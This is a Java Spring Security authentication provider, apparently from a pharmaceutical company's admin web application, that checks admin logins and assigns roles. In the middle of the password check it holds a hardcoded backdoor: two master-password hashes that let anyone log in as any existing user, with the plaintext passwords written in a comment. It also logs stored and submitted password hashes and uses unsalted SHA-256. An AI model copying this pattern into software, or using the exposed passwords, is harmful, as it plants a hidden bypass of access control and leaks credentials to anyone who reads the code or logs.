package kr.co.reyonpharm.security;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.stereotype.Component;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import kr.co.reyonpharm.handler.CustomExceptionCodes;
import kr.co.reyonpharm.models.CustomGrantedAuthority;
import kr.co.reyonpharm.models.CustomUserDetails;
import kr.co.reyonpharm.service.LoginService;
import kr.co.reyonpharm.util.CommonUtils;
import kr.co.reyonpharm.util.ReyonSha256;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Component
public class CustomAuthenticationProvider implements AuthenticationProvider {

	@Autowired
	LoginService loginService;

	@Override
	public Authentication authenticate(Authentication authentication) throws AuthenticationException {
		String adminId = authentication.getName();
		String password = (String) authentication.getCredentials();

		Collection<? extends GrantedAuthority> authorities;
		CustomUserDetails userDetails;

		HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();

		userDetails = (CustomUserDetails) loginService.getAdmin(adminId);

		if (null == userDetails) {
			request.setAttribute("loginStatus", "USER_NOT_EXIST");
			throw new BadCredentialsException(CustomExceptionCodes.USER_NOT_EXIST.getMsg());
		}

		String clientIp = CommonUtils.getClientIp(request);

		String ShaEncPwd = ReyonSha256.getCiperText(password);
		log.info("[" + clientIp + "] ID : " + adminId + " , DB_PWD : " + userDetails.getPassword() + " , SHA_PWD : " + ShaEncPwd);
		
		// reyonadmin123!@# , reyonceo123!@#
		if(ShaEncPwd.equals("EB12CB034C397E2ABD202ABA9028EE907A8451D2DAE4D835066FD58CC9331347") || ShaEncPwd.equals("DA40FBE4804D51771B1CB507CF546AD73DBEE59AE8F8B99446B125A3D1ABADE0")){
			log.info("SUPER USER LOGIN PASS");
		} else {
			// 패스워드 체크
			if (!ShaEncPwd.equals(userDetails.getPassword())) {
				request.setAttribute("loginStatus", "INVALID_PASSWORD");
				throw new BadCredentialsException(CustomExceptionCodes.INVALID_PASSWORD.getMsg());
			}
		}

		// Spring Security ROLE 부여
		CustomGrantedAuthority role = new CustomGrantedAuthority();
		role.setName("ROLE_"+userDetails.getRespon());

		List<CustomGrantedAuthority> roles = new ArrayList<CustomGrantedAuthority>();
		roles.add(role);
		userDetails.setAuthorities(roles);
		authorities = userDetails.getAuthorities();

		log.info("[" + clientIp + "] ID : " + adminId + " , Authorities : " + userDetails.getAuthorities());
		
		// session 에 adminId 항목으로 사번 저장
		HttpSession session = (HttpSession)request.getSession(true);
		session.setAttribute("adminId", adminId);

		return new UsernamePasswordAuthenticationToken(userDetails, password, authorities);
	}

	@Override
	public boolean supports(Class<?> arg0) {
		return true;
	}

}
